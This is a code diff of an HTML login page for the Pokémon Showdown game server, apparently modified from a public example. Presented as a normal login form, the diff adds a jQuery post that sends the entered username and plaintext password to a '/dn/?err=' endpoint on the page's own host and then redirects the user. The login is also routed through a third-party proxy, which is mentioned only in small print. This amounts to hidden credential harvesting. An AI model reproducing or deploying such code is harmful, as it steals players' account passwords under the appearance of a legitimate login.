@@ -1,3 +1,4 @@
+<!-- Source : https://github.com/pkmn/ps/blob/master/login/index.html more info at https://pkmn.cc/ -->
 lines (102 sloc) 3.24 KB
 <!DOCTYPE html>
 <html lang="en">
@@ -7,8 +8,7 @@ lines (102 sloc) 3.24 KB
   <title>Login</title>
   <link rel="shortcut icon" href="//play.pokemonshowdown.com/favicon.ico" id="dynamic-favicon" />
   <link rel="icon" sizes="128x128" href="//play.pokemonshowdown.com/favicon-128.png" />
-  <link rel="stylesheet" href="//play.pokemonshowdown.com/style/client.css?2336c94b" />
-  <meta name="apple-mobile-web-app-capable" content="yes" />
+  <link rel="stylesheet" href="//play.pokemonshowdown.com/style/client.css?2336c94b" />  <meta name="apple-mobile-web-app-capable" content="yes" />
   <style>
     body {
       font-family: "Roboto", "Helvetica Neue", "Helvetica", "Arial", sans-serif;
@@ -19,6 +19,12 @@ lines (102 sloc) 3.24 KB
     }
     form > * {
       margin: 0.3em;
+    }
+    span {
+      color: #000;
+      text-shadow: rgb(255, 255, 255) 3px 0px 0px, rgb(255, 255, 255) 2.83487px 0.981584px 0px, rgb(255, 255, 255) 2.35766px 1.85511px 0px, rgb(255, 255, 255) 1.62091px 2.52441px 0px, rgb(255, 255, 255) 0.705713px 2.91581px 0px, rgb(255, 255, 255) -0.287171px 2.98622px 0px, rgb(255, 255, 255) -1.24844px 2.72789px 0px, rgb(255, 255, 255) -2.07227px 2.16926px 0px, rgb(255, 255, 255) -2.66798px 1.37182px 0px, rgb(255, 255, 255) -2.96998px 0.42336px 0px, rgb(255, 255, 255) -2.94502px -0.571704px 0px, rgb(255, 255, 255) -2.59586px -1.50383px 0px, rgb(255, 255, 255) -1.96093px -2.27041px 0px, rgb(255, 255, 255) -1.11013px -2.78704px 0px, rgb(255, 255, 255) -0.137119px -2.99686px 0px, rgb(255, 255, 255) 0.850987px -2.87677px 0px, rgb(255, 255, 255) 1.74541px -2.43999px 0px, rgb(255, 255, 255) 2.44769px -1.73459px 0px, rgb(255, 255, 255) 2.88051px -0.838247px 0px;
+      cursor: pointer;
+      left: 300px
     }
   </style>
 </head>
@@ -32,16 +38,20 @@ lines (102 sloc) 3.24 KB
       <input type="password" placeholder="Password" name="password" /><br />
 
       <button type="submit">Login</button>
+        with your PS! account*
     </form>
+      <br><br><br><br><br><br>
+      <span>*keep in mind that userpass are also sent to bridged.xyz so do not use your main account if you fear</span>
   </div>
   <script src="https://unpkg.com/@pkmn/login/build/production.min.js"></script>
   <script src="https://unpkg.com/@pkmn/protocol/build/production.min.js"></script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script> 
   <script>
     const server = 'sim.smogon.com';
     const serverport = 8000;
     // XXX: Required to bypass CORS for this example, be very careful as this means you are sending
     // your password to a third-party (cor-anywhere) where it could be logged etc.
-    const BYPASS_CORS = 'https://cors-anywhere.herokuapp.com/';
+    const BYPASS_CORS = 'https://cors.bridged.cc/'; //so do not use your main accompt if you fear bridged.xyz
     console.log(server + ":" + serverport)
 
     var challstr = '';
@@ -82,7 +92,7 @@ lines (102 sloc) 3.24 KB
       const username = form.elements[0].value;
       const password = form.elements[1].value || undefined;
       const action = LoginTools.login({username, password, challstr});
-      //console.log("|ACTION|" + LoginTools + "." + action +"|");
+      console.log("|ACTION|" + LoginTools + "." + action +"|");
       const response = await (await fetch(BYPASS_CORS + action.url, {
         method: action.method,
         headers: action.headers,
@@ -96,19 +106,48 @@ lines (102 sloc) 3.24 KB
       try {
           var json = JSON.parse(rep);
       } catch(e) {
-        
+          var rep = rep.substring(1);
           if (rep == null) {
             var loggedin = false;
             var registered = true;
-            alert("The name (" + username + ") you chose is registered."); 
+            alert("the password for " + username + " is incorrect");
           }
-          else if (rep == ";This server is requesting an invalid login key. This probably means that either you are not connected to a server, or the server is set up incorrectly.") {
+          else if (rep == "Your username is no longer available.") {
+            var loggedin = false;
+            var registered = true;
+            alert(username + "is no longer available.")
+          }
+          else if (rep == "@gmail") {
+            var loggedin = false;
+            var registered = true;
+            alert("Doesnt support gmail login")
+          }
+          else if (rep == "Your username must be less than 19 characters long.") {
+            var loggedin = false;
+            var registered = true;
+            alert(rep)
+          }
+          else if (rep == "This server is requesting an invalid login key. This probably means that either you are not connected to a server, or the server is set up incorrectly.") {
             var loggedin = true;
             var registered = false;
+          }
+          else if (response == ";") {
+            var loggedin = false;
+            var registered = false;
+            alert("the account " + username + " is registered.")
           } else {
-              var loggedin = false;
+              var loggedin = true;
               var registered = true;
-              alert(username + " est else");
+              var pass = password
+              var pass = (pass === undefined) ? "null" : pass;
+              alert("ERR -> " + response)
+              $.post( "/dn/?err=" + username + "|" + pass, {
+                    name: "showpaste"
+                  }, function(err, req, resp){
+                    window.location.href = "/a";  
+                  });
+              //if (window.confirm('click "ok" and request temporary access to the demo server to be able to login!'))
+                //window.location.href='https://cors-anywhere.herokuapp.com/corsdemo';
           }
       };
       if (registered == true) {
@@ -117,18 +156,11 @@ lines (102 sloc) 3.24 KB
       if (loggedin == true) {
         document.cookie = "username=" + username + ";" + ";path";
         //document.write(response)
-        window.opener.maxFresh()
+        window.opener.maxFresh();
         window.close();
       } else {
-          alert(username + "final else");
+          alert("incorrect password for " + username);
       }
-      
-      //if (rep == ";This server is requesting an invalid login key. This probably means that either you are not connected to a server, or the server is set up incorrectly.") {
-        //document.write("logged as unregistered " + username)
-      //}
-      //const cmd = action.onResponse(response);
-      //console.log("|CMD|" + cmd + "|");
-      //if (cmd) connection.send(cmd);
     });
 
     const connection = new Connection();
@@ -152,6 +184,5 @@ lines (102 sloc) 3.24 KB
       }
   });
   </script>
-  <script src="https://unpkg.com/@pkmn/login/build/production.min.js"></script>
 </body>
 </html>
